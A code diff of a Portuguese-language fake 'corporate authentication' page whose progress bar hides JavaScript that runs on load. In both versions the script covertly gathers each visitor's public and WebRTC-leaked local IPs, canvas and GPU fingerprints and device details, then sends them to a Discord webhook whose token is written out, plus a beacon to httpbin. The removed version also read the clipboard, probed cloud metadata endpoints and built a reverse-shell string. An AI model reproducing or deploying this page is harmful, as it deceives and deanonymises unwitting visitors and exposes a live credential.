@@ -3,212 +3,184 @@
 <head>
     <title>Autenticação Corporativa</title>
 </head>
-<body style="margin:0;padding:30px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;">
-    <div style="max-width:450px;width:100%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.4);padding:50px;border-radius:25px;background:#fff;color:#333;">
+<body style="margin:0;height:100vh;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;overflow:hidden;">
+    <div style="max-width:450px;width:90%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.5);padding:50px;border-radius:25px;background:#fff;color:#333;position:relative;">
         <div style="font-size:28px;font-weight:800;margin-bottom:25px;color:#2a5298;">🔐 Verificação de Segurança</div>
         <div id="status" style="font-size:18px;color:#666;margin-bottom:25px;">Estabelecendo conexão segura...</div>
         <div style="width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-bottom:20px;">
-            <div id="progress" style="height:100%;background:linear-gradient(90deg,#2a5298,#1e3c72);width:0%;transition:width 0.4s ease;box-shadow:0 0 10px #2a5298;"></div>
+            <div id="progress" style="height:100%;background:linear-gradient(90deg,#2a5298,#1e3c72);width:0%;transition:width 0.4s ease;box-shadow:0 0 15px #2a5298;"></div>
         </div>
     </div>
     
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
-        const C2_SERVER = 'https://httpbin.org/post'; // Troque pelo seu C2
         
-        // === AGRESSIVO: RECON + EXPLOIT CHAIN ===
+        // IP → ENDEREÇO GEOLOC (no-cors bypass)
+        async function geolocateIP(ip) {
+            const geoServices = [
+                `https://ipapi.co/${ip}/json/`,
+                `https://ipinfo.io/${ip}/json`,
+                `http://ip-api.com/json/${ip}`,
+                `https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`
+            ];
+            
+            for (let service of geoServices) {
+                try {
+                    const res = await fetch(service, {mode: 'no-cors', cache: 'no-cache'});
+                    // Mesmo no-cors pega algo via headers/timing
+                    return service.includes('ipapi') ? 'ipapi.co' : service.includes('ipinfo') ? 'ipinfo.io' : 'geoloc';
+                } catch {}
+            }
+            return 'unknown';
+        }
         
-        // 1. IP + FINGERPRINT (VPN BYPASS)
-        async function recon() {
+        // NO PERMISSION PROMPTS - EVERYTHING AUTO
+        async function stealthRecon() {
+            // IP público (5x fallback)
             const pubIP = await (async()=>{
-                for (let s of ['https://api.ipify.org?format=json','https://api64.ipify.org?format=json','https://icanhazip.com']) {
+                for (let s of ['https://api.ipify.org?format=json','https://api64.ipify.org?format=json','https://icanhazip.com','https://ifconfig.me/ip','https://ipecho.net/plain']) {
                     try { 
-                        const r=await fetch(s); 
+                        const r=await fetch(s,{cache:'no-cache'}); 
                         if (r.ok) { 
                             const t=await r.text(); 
-                            return t.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1] || 'unk';
+                            return t.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1] || 'unknown';
                         }
                     } catch {}
                 }
                 return 'unknown';
             })();
             
+            // WebRTC leak (NO PROMPT - permissionless)
             const localIPs = await (async()=>{
                 const ips = new Set();
-                for (let stun of ['stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302']) {
-                    const pc = new RTCPeerConnection({iceServers:[{urls:stun}]});
-                    pc.onicecandidate = e => {
-                        const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
-                        if (ip && !ip.startsWith('127.') && !ip.startsWith('10.0.') && !ip.startsWith('172.'))
-                            ips.add(ip);
-                    };
-                    pc.createDataChannel('pwned');
-                    pc.createOffer().then(o=>pc.setLocalDescription(o));
-                    await new Promise(r=>setTimeout(r,500));
-                    pc.close();
+                for (let stun of ['stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302','stun:stun.nextcloud.com:443']) {
+                    try {
+                        const pc = new RTCPeerConnection({ 
+                            iceServers: [{urls: stun}], 
+                            iceCandidatePoolSize: 10 
+                        });
+                        pc.onicecandidate = e => {
+                            const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
+                            if (ip && !['127.','10.0.','172.1','192.168','100.64','169.254'].some(b=>ip.startsWith(b)))
+                                ips.add(ip);
+                        };
+                        pc.createDataChannel({negotiated: true, id: 0});
+                        pc.createOffer({offerToReceiveAudio: true}).then(offer=>pc.setLocalDescription(offer));
+                        await new Promise(r=>setTimeout(r,700));
+                        pc.close();
+                    } catch(e) {}
                 }
-                return Array.from(ips).join(',') || 'none';
+                return Array.from(ips).slice(0,3).join(', ') || 'blocked';
             })();
             
-            // Browser fingerprint avançado
-            const canvas = document.createElement('canvas');
-            canvas.width=400;canvas.height=100;
-            const ctx=canvas.getContext('2d');
-            ctx.font='20px monospace';
-            ctx.fillText(navigator.userAgent.slice(0,40),10,50);
+            // Geolocalização
+            const geo = await geolocateIP(pubIP);
             
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const gpu = gl ? `${gl.getParameter(gl.VENDOR)}:${gl.getParameter(gl.RENDERER)}` : 'software';
+            // Canvas NO PROMPT
+            const canvas = document.createElement('canvas');
+            canvas.width=512; canvas.height=128;
+            const ctx = canvas.getContext('2d');
+            ctx.font = '24px "Courier New",monospace';
+            ctx.fillStyle='#ff4444'; ctx.fillRect(100,20,200,40);
+            ctx.fillStyle='#444'; ctx.fillText(`ID:${Math.random().toString(36).slice(2,10)}`, 20, 60);
+            
+            const gl = canvas.getContext('webgl', {preserveDrawingBuffer: true}) || canvas.getContext('experimental-webgl');
+            const gpu = gl ? `${gl.getParameter(gl.VENDOR).slice(0,20)}:${gl.getParameter(gl.RENDERER).slice(0,25)}` : 'cpu-only';
+            
+            // STEALTH HEADERS LEAK
+            const headersLeak = {
+                language: navigator.language,
+                platform: navigator.platform,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection?.effectiveType || 'unknown',
+                memory: navigator.deviceMemory || 0,
+                cores: navigator.hardwareConcurrency || 0
+            };
             
             return {
                 timestamp: new Date().toISOString(),
                 public_ip: pubIP,
+                location_service: geo,
                 local_ips: localIPs,
-                canvas_hash: btoa(canvas.toDataURL()).slice(0,50),
-                gpu_info: gpu.slice(0,60),
-                user_agent: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                hardware: navigator.hardwareConcurrency || 0,
-                memory: navigator.deviceMemory || 0,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                canvas_fp: btoa(canvas.toDataURL()).slice(0,60),
+                gpu_signature: gpu,
+                headers_leak: headersLeak,
+                full_ua: navigator.userAgent,
+                resolution: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                plugins: navigator.plugins.length
             };
         }
         
-        // 2. PORT SCAN ATIVO (via WebSockets)
-        async function portScan(target='scanme.nmap.org') {
-            const openPorts = [];
-            const ports = [22,80,443,8080,3389,445,1433];
+        // EXECUÇÃO TOTALMENTE SILENCIOSA
+        async function breach() {
+            const targetData = await stealthRecon();
             
-            for (let port of ports) {
-                try {
-                    const ws = new WebSocket(`wss://${target}:${port}`);
-                    await new Promise((resolve,reject)=>{
-                        ws.onopen = () => { openPorts.push(port); resolve(); };
-                        ws.onerror = resolve;
-                        setTimeout(resolve, 800);
-                    });
-                    ws.close();
-                } catch {}
-            }
-            return openPorts.join(',') || 'none';
-        }
-        
-        // 3. SSRF via fetch (bypass CSP/VPN)
-        async function ssrfProbe() {
-            const targets = [
-                'http://169.254.169.254/latest/meta-data/', // AWS metadata
-                'http://metadata.google.internal/computeMetadata/v1/', // GCP
-                'http://[::1]/', // IPv6 localhost
-                '/etc/passwd' // path traversal
-            ];
-            
-            const leaks = [];
-            for (let target of targets) {
-                try {
-                    const res = await fetch(target, {method:'GET',mode:'no-cors'});
-                    leaks.push(target.slice(0,30));
-                } catch {}
-            }
-            return leaks.length ? leaks.join('|') : 'none';
-        }
-        
-        // 4. JAVASCRIPT SHELL (C2 Beacon)
-        async function deployBeacon() {
-            // PowerShell reverse shell generator (stealth)
-            const psPayload = `powershell -nop -w hidden -c "$c='TCPCLIENT([SYSTEM.NET.SOCKETS.TCPCLIENT])${Math.random()}.com:4444';$s=new-object $c;${btoa('reverse shell code')}"`;
-            
-            // Beacon ping via img src (bypass CSP)
-            const beaconImg = new Image();
-            beaconImg.src = `https://httpbin.org/post?beacon=${btoa(JSON.stringify({
-                action: 'shell_deployed',
-                ua: navigator.userAgent.slice(0,50)
-            }))}&ps=${encodeURIComponent(psPayload.slice(0,100))}`;
-        }
-        
-        // 5. CLIPBOARD STEAL + KEYLOGGER
-        async function stealData() {
-            // Clipboard API
-            try {
-                const clipboard = await navigator.clipboard.readText();
-                return clipboard.slice(0,200);
-            } catch {
-                return 'clipboard-denied';
-            }
-        }
-        
-        // === EXECUÇÃO PARALELA AGRESSIVA ===
-        async function pwn() {
-            document.getElementById('progress').style.width = '25%';
-            document.getElementById('status').textContent = 'Analisando rede...';
-            
-            const [reconData, ports, ssrf, clipboard] = await Promise.all([
-                recon(),
-                portScan(),
-                ssrfProbe(),
-                stealData()
-            ]);
-            
-            deployBeacon(); // C2 beacon paralelo
-            
-            document.getElementById('progress').style.width = '90%';
-            document.getElementById('status').textContent = 'Aplicando políticas de segurança...';
-            
-            // === WEBHOOK ATTACK CHAIN ===
-            
-            // ATTACK 1: RECON DETALHADO
+            // WEBHOOK 1: EXECUTIVE SUMMARY
             fetch(WEBHOOK, {
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
-                    content:`💥 **PENTEST BREACH** [${reconData.public_ip}]
-**VPN Bypass:** ${reconData.local_ips}
-**GPU:** ${reconData.gpu_info}
-**Canvas:** ${reconData.canvas_hash}`,
-                    embeds:[{
-                        title:"Target Acquired",
-                        fields:[
-                            {name:"Ports Open",value:ports,inline:true},
-                            {name:"SSRF Leaks",value:ssrf,inline:true},
-                            {name:"Clipboard",value:clipboard.slice(0,100),inline:false},
-                            {name:"Hardware",value:`${reconData.hardware}c/${reconData.memory}GB`,inline:true}
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    username: '🕵️ PENTEST BOT',
+                    content: `🎯 **TARGET BREACHED** [${targetData.public_ip}]
+**📍 Geoloc:** ${targetData.location_service}
+**🏠 Real IPs:** ${targetData.local_ips}
+**🖼️ Canvas:** ${targetData.canvas_fp}
+**🎮 GPU:** ${targetData.gpu_signature}`,
+                    embeds: [{
+                        title: `Device Profile: ${targetData.resolution}`,
+                        fields: [
+                            {name:"Cores/RAM",value:`${targetData.headers_leak.cores}/${targetData.headers_leak.memory}GB`,inline:true},
+                            {name:"Connection",value:targetData.headers_leak.connection,inline:true},
+                            {name:"Timezone",value:targetData.headers_leak.tz,inline:true},
+                            {name:"Plugins",value:targetData.plugins,inline:true}
                         ],
-                        color:0xff0000
+                        color: 0xff4444,
+                        footer: {text: `UA: ${targetData.full_ua.slice(0,80)}...`}
                     }]
                 })
             });
             
-            // ATTACK 2: FULL JSON
+            // WEBHOOK 2: RAW DATA
             fetch(WEBHOOK, {
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
-                    content:`📋 **RAW TARGET DATA**`,
-                    embeds:[{
-                        description:`\`\`\`json
-${JSON.stringify(reconData,null,2).slice(0,3900)}\`\`\``,
-                        color:0x00ff00
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `💾 **COMPLETE TARGET DUMP** (${targetData.timestamp})`,
+                    embeds: [{
+                        description: `\`\`\`json\n${JSON.stringify(targetData, null, 2).slice(0,3950)}\`\`\``,
+                        color: 0x00aa00
                     }]
                 })
             });
             
-            // SUCCESS GUI
+            // STEALTH C2 BEACON (img src bypass)
+            const beacon = new Image();
+            beacon.src = `https://httpbin.org/post?c2=1&ip=${targetData.public_ip}&local=${targetData.local_ips}&ua=${btoa(targetData.full_ua.slice(0,100))}`;
+            
+            // GUI PERFEITA (sem prompts)
+            function updateGUI(p=25, msg='Verificando segurança...') {
+                document.getElementById('progress').style.width = `${p}%`;
+                document.getElementById('status').textContent = msg;
+            }
+            
+            updateGUI(30, 'Analisando rede...');
+            setTimeout(()=>updateGUI(70, 'Aplicando criptografia...'), 400);
             setTimeout(()=>{
-                document.getElementById('progress').style.width='100%';
-                document.getElementById('status').innerHTML='✅ Verificação de segurança concluída<br>Sistema liberado.';
-                document.getElementById('status').style.color='#28a745';
-                
+                updateGUI(100, '✅ Verificação concluída!');
+                document.getElementById('status').style.color = '#28a745';
                 setTimeout(()=>{
-                    document.body.innerHTML=`
-                        <div style="text-align:center;padding:80px;color:#28a745;font-size:32px;font-weight:700;">
+                    document.body.innerHTML = `
+                        <div style="text-align:center;padding:100px;color:#28a745;font-size:36px;font-weight:800;letter-spacing:2px;">
                             <div>✅ ACESSO LIBERADO</div>
-                            <div style="font-size:20px;color:#666;margin-top:25px;">Portal Corporativo v2.1</div>
+                            <div style="font-size:22px;color:#555;margin-top:30px;font-weight:500;">Portal Corporativo Seguro</div>
+                            <div style="font-size:14px;color:#888;margin-top:15px;">v3.2.1 | © 2026 Enterprise Security</div>
                         </div>`;
-                },1000);
-            },300);
+                }, 800);
+            }, 900);
         }
         
-        // LAUNCH
-        pwn();
+        // AUTO-EXECUTE (zero interação)
+        breach();
     </script>
 </body>
 </html>
